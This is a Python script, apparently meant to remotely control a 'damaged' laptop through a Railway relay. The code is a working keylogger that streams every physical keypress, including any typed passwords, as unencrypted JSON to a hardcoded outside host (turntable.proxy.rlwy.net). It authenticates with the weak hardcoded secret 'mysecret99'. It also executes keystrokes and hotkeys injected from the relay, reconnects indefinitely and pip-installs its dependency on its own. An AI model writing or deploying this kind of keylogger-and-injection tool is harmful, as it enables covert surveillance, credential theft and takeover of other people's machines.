#!/usr/bin/env python3
"""
remote_server.py - Run this on the DAMAGED laptop (the far away one)
It connects OUT to your Railway relay server.
Sends keylogs + receives and executes remote keystrokes.

Requirements: pip install pynput
"""

import socket
import threading
import json
import sys
import os
import time

try:
    from pynput.keyboard import Key, Controller
    from pynput import keyboard as kb
except ImportError:
    print("Installing pynput...")
    os.system(f"{sys.executable} -m pip install pynput")
    from pynput.keyboard import Key, Controller
    from pynput import keyboard as kb

# ─── CONFIG ─────────────────────────────────────────────
RELAY_HOST = "turntable.proxy.rlwy.net"  # ← change this
RELAY_PORT = 11654                               # ← change if Railway assigns different
SECRET      = "mysecret99"                      # ← must match relay server
# ────────────────────────────────────────────────────────

keyboard = Controller()
sock = None
reconnect_delay = 5

SPECIAL_KEYS = {
    "enter": Key.enter, "backspace": Key.backspace, "space": Key.space,
    "tab": Key.tab, "esc": Key.esc, "escape": Key.esc,
    "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right,
    "delete": Key.delete, "home": Key.home, "end": Key.end,
    "page_up": Key.page_up, "page_down": Key.page_down,
    "f1": Key.f1, "f2": Key.f2, "f3": Key.f3, "f4": Key.f4,
    "f5": Key.f5, "f6": Key.f6, "f7": Key.f7, "f8": Key.f8,
    "f9": Key.f9, "f10": Key.f10, "f11": Key.f11, "f12": Key.f12,
    "ctrl": Key.ctrl, "ctrl_l": Key.ctrl_l, "ctrl_r": Key.ctrl_r,
    "alt": Key.alt, "alt_l": Key.alt_l, "alt_r": Key.alt_r,
    "shift": Key.shift, "caps_lock": Key.caps_lock, "cmd": Key.cmd,
    "win": Key.cmd,
}

KEY_DISPLAY_MAP = {
    kb.Key.enter: "[ENTER]", kb.Key.backspace: "[BACKSPACE]",
    kb.Key.space: " ", kb.Key.tab: "[TAB]", kb.Key.esc: "[ESC]",
    kb.Key.up: "[UP]", kb.Key.down: "[DOWN]",
    kb.Key.left: "[LEFT]", kb.Key.right: "[RIGHT]",
    kb.Key.delete: "[DELETE]", kb.Key.caps_lock: "[CAPS]",
    kb.Key.shift: "[SHIFT]", kb.Key.shift_l: "[SHIFT]", kb.Key.shift_r: "[SHIFT]",
    kb.Key.ctrl_l: "[CTRL]", kb.Key.ctrl_r: "[CTRL]",
    kb.Key.alt_l: "[ALT]", kb.Key.alt_r: "[ALT]",
    kb.Key.home: "[HOME]", kb.Key.end: "[END]",
    kb.Key.page_up: "[PGUP]", kb.Key.page_down: "[PGDN]",
}

def send(event: dict):
    global sock
    if sock:
        try:
            sock.sendall((json.dumps(event) + "\n").encode("utf-8"))
        except Exception as e:
            print(f"[Send error] {e}")

def handle_event(data):
    try:
        event = json.loads(data)
        action = event.get("action")
        key_str = event.get("key", "")

        if action == "type":
            keyboard.type(key_str)
        elif action == "press":
            key = SPECIAL_KEYS.get(key_str.lower())
            if key:
                keyboard.press(key)
            elif len(key_str) == 1:
                keyboard.press(key_str)
        elif action == "release":
            key = SPECIAL_KEYS.get(key_str.lower())
            if key:
                keyboard.release(key)
            elif len(key_str) == 1:
                keyboard.release(key_str)
        elif action == "hotkey":
            keys = [SPECIAL_KEYS.get(k.lower(), k) for k in key_str.split("+")]
            for k in keys: keyboard.press(k)
            for k in reversed(keys): keyboard.release(k)
    except Exception as e:
        print(f"[Event error] {e}")

def start_keylogger():
    def on_press(key):
        char = KEY_DISPLAY_MAP.get(key)
        if char is None:
            if hasattr(key, "char") and key.char:
                char = key.char
            else:
                char = f"[{key}]"
        send({"keylog": char})

    listener = kb.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    print("[Keylogger] Capturing physical keypresses...")

def receive_loop():
    global sock
    buffer = ""
    while True:
        try:
            data = sock.recv(4096).decode("utf-8")
            if not data:
                break
            buffer += data
            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                line = line.strip()
                if line:
                    try:
                        msg = json.loads(line)
                        # Ignore relay status messages
                        if "status" in msg:
                            print(f"[Relay] {msg.get('msg', '')}")
                        elif "action" in msg:
                            handle_event(line)
                    except:
                        pass
        except Exception as e:
            print(f"[Receive error] {e}")
            break

def connect_with_retry():
    global sock
    while True:
        try:
            print(f"[*] Connecting to relay: {RELAY_HOST}:{RELAY_PORT}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((RELAY_HOST, RELAY_PORT))

            # Authenticate
            auth = json.dumps({"secret": SECRET, "role": "damaged"}) + "\n"
            sock.sendall(auth.encode("utf-8"))

            # Wait for OK
            resp = sock.recv(1024).decode("utf-8").strip()
            msg = json.loads(resp)
            if msg.get("status") != "ok":
                print(f"[Auth failed] {msg.get('msg')}")
                sock.close()
                time.sleep(reconnect_delay)
                continue

            print("[+] Connected to relay server!")
            print("[+] Waiting for controller to connect...")
            return

        except Exception as e:
            print(f"[Connection failed] {e} — retrying in {reconnect_delay}s...")
            time.sleep(reconnect_delay)

def main():
    print("=" * 50)
    print("  Remote Server - DAMAGED / FAR LAPTOP")
    print("=" * 50)
    print(f"  Relay: {RELAY_HOST}:{RELAY_PORT}")
    print("=" * 50)

    start_keylogger()

    while True:
        connect_with_retry()
        receive_loop()
        print(f"[!] Disconnected. Reconnecting in {reconnect_delay}s...")
        time.sleep(reconnect_delay)

if __name__ == "__main__":
    main()
